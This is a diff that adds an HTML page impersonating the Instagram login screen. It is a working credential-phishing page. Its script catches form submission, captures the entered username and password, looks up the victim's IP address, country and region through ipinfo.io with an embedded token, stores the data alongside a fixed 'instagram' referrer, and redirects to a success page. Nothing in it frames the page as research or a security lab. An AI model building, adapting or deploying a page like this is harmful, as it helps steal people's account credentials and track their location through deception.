@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Proceed</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://wave-inky-product.glitch.me/ig%20index%20style.css">
+</head>
+<body>
+     <div id="fadeImageContainer" class="fade-image-container">
+        <img id="fadeImage" src="https://resourcesss.github.io/Pics/im.png" alt="Image" class="fade-image">
+    </div>
+    
+    <img id="ign" src="https://resourcesss.github.io/Pics/ign.png">
+    
+  <form id="detailsForm">
+        
+        <input class="input-box" type="text" id="username"  name ="username" placeholder="Phone number, username, or email" required>
+
+        <input class="input-box" id="message" type="password" name="password" name="message" placeholder="Password" required> 
+
+        <button  type="submit" class="bnt"><img class="lo" src="https://resourcesss.github.io/Pics/lo.png"></button>
+    </form>
+    
+    <p class="for">Forgot password?</p>
+    
+    <p class="text">Don't have an account?<a href="#" id="fadeLink">Sign up</a></p>
+    
+    <p class="get">Get the app</p>
+    <img id="store" src="https://resourcesss.github.io/Pics/play.png">
+    <img id="sto" src="https://resourcesss.github.io/Pics/apple.png">
+
+    <footer>
+        <ul>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">Support</a></li>
+            <li><a href="#">Blog</a></li>
+            <li><a href="#">Press</a></li>
+            <li><a href="#">Api</a></li>
+            <li><a href="#">Jobs</a></li> 
+            <li><a href="#">Privacy</a></li>
+            <li><a href="#">Terms</a></li>
+            <li><a href="#">Directory</a></li>
+        </ul>
+    </footer>
+    
+    <script>
+        window.addEventListener('load', function() {
+    // Fade in the page content
+    document.body.style.opacity = '1';
+    
+    // Fade out the logo
+    const fadeImageContainer = document.getElementById('fadeImageContainer');
+    fadeImageContainer.style.opacity = '1';
+    fadeImageContainer.style.transition = 'opacity 3s';
+    setTimeout(() => {
+        fadeImageContainer.style.opacity = '0';
+    }, 100);
+});
+
+
+document.getElementById('detailsForm').addEventListener('submit', function(event) {
+    event.preventDefault();
+
+    const username = document.getElementById('username').value;
+    const message = document.getElementById('message').value;
+    const date = new Date().toLocaleString();
+    const referrer = 'instagram'; // Set a fixed referrer name for this page
+
+    fetch('https://ipinfo.io?token=aaad8e9b2f8309')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const country = data.country;
+            const state = data.region;
+
+            return fetch(`https://restcountries.com/v3.1/alpha/${country}`)
+                .then(response => response.json())
+                .then(countryData => {
+                    const phoneCode = countryData[0].idd.root + countryData[0].idd.suffixes[0];
+
+                    const details = JSON.parse(localStorage.getItem('details')) || [];
+                    details.push({
+                        username,
+                        message,
+                        ip,
+                        country: countryData[0].name.common,
+                        state,
+                        phoneCode,
+                        date,
+                        referrer
+                    });
+                    localStorage.setItem('details', JSON.stringify(details));
+
+                    // Redirect to success.html
+                    window.location.href = 'success.html';
+                });
+        })
+        .catch(error => {
+            console.error('Error fetching IP or country information:', error);
+        });
+});
+
+    </script>
+</body>
+</html>
